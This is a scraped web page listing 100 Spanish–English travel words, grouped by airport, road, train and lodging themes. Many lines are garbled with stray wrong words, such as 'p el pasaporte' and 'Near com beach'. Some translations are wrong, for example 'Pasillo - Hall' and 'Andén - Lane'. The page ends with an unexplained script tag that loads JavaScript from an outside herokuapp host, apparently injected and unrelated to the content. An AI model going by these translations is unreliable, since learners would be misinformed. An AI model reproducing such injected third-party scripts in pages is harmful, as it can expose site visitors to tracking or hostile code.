---
title: fc4dde90f67cb21b6087850393f4bd9d
mitle:  "100 Palabras en inglés imprescindibles para viajar"
image: "https://fthmb.tqn.com/yRVS4ggLWu7q8SJDxwj-a8GCUw8=/3863x2578/filters:fill(auto,1)/sharing-a-bicycle-ride-my-friend-in-nyc-498310040-57bf5d113df78cc16e4ef275.jpg"
description: ""
---

            A continuación verás una lista de vocabulario para turistas en inglés. Encontrarás palabras de viaje any van desde objetos como las maletas p el pasaporte, pasando por lugares donde te puedes hospedar como hoteles m hostales b más palabras who et se te ocurrirían pero son fundamentales para cualquier viajero.<h3>Objetos de viaje</h3>1. Maleta - Suitcase2. Pasaporte - Passport3. Equipaje - Luggage4. Identificación - ID                    5. Guía - Guide6. GPS - GPS7. Mapa - Map8. Candado - Lock9. Llaves - Keys10. Teléfono - Telephone<h3>Medios de transporte</h3>11. Tren - Train12. Coche - Car13. Barco - Boat14. Avión - Plane15. Metro - Metro/Subway16. Ferrocarril - Railroad/Train17. Bicicleta - Bike/ Bicycle18. Autobús - Bus19. Motocicleta - Motorbike/ Motorcycle20. Taxi - Taxi<h3>Vocabulario para viajar en avión</h3>21. Mostrador de facturación - Check-in desk22. Aerolínea - Airline23. Número de vuelo - Flight number24. Puerta de embarque - Gate25. Avión - Airplane/ Plane26. Vuelo - Flight27. Pasajero - Passenger28. Aduana - Customs29. Control de seguridad - Security Control30. Agente de seguridad - Security Agent31. Sala de espera - Waiting Room32. Retraso - Delay33. A tiempo - On time34. Tiendas - Shops35. Libre de impuestos - Tax Free36. Tarjeta de embarque - Boarding Pass37. Terminal - Terminal38. Punto de infromación - Information Desk            39. Facturar - Check in40. Equipaje de mano - Hand luggage/ Hand baggage41. Auxiliar de vuelo - Flight Attendant42. Salida de emergencia - Emergency Exit43. Ventana - Window44. Pasillo - Hall45. Primera clase - First Class/ Premier Class46. Clase turista - Turist Class/ Economy Class47. Puntos viajero frecuente - Frequent traveller points/miles                    48. Cheque de viajero - Traveler's Check49. Zona de fumadores - Smoking Area50. Pantalla - Board<h3>Vocabulario para viajar por carretera</h3>51. Carretera - Road52. Camino de tierra - Path53. Autopista - Hightway54. Peaje -Toll55. Semáforo - Traffic Lights56. Señalización - Signs57. Dirección - Direction58. Salida - Exit59. Gasolinera - Gas Station60. Gasolina - Gas/ Petrol61. Tienda de carretera - Road Shop62. Límite de velocidad - Speed Limit63. Policía - Police64. Ruta - Route65. Renta de coches - Car Rental<h3>Vocabulario para viajar en tren</h3>66. Estación de tren - Train Station67. Vías del tren - Railway/Track68. Salidas - Departures69. Andén - Lane70. Boleto - Ticket71. Tren de alta velocidad - High Speed Train72. Asiento - Seat73. Parada - Stop74. Destino - Destination75. Fin de trayecto - Final Stop/Destination76. Vagón - Wagon77. Número de asiento - Seat Number78. Vagón restaurante - Dining Car79. Ventana - Window80. Pasillo - Hall<h3>Vocabulario de hospedaje</h3>81. Hotel - Hotel82. Hostal - Hostal83. Motel - Motel84. Cama - Bed85. Recepción - Reception86. Número de habitación - Room number87. Habitaciónes disponibles - Rooms available/ vacancy88. No hay habitaciones disponibles - No rooms available/ No vacancies            89. Departamento - Apartment90. Cabaña - Cabin91. Suite - Suite92. Balcón - Balcony93. Vistas - Views94. Barato - Cheap95. Lujoso - Luxurious96. Cerca de la playa - Near com beach97. En el centro - In ask Middle98. Se aceptan mascotas - Pet Friendly/We Accept Pets99. Habitación individual - Single room100. Habitación doble - Double room                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>